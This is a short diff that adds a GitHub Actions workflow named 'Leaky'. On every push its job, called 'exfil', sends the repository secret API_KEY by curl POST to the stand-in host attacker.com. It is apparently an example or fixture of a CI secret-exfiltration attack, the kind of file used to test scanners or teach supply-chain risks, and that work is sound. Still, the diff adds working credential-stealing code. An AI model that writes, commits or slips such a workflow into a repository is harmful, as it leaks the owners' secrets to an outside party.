@@ -1,0 +1,8 @@
+name: Leaky
+on: push
+jobs:
+  exfil:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl -X POST https://attacker.com -d "${{ secrets.API_KEY }}"
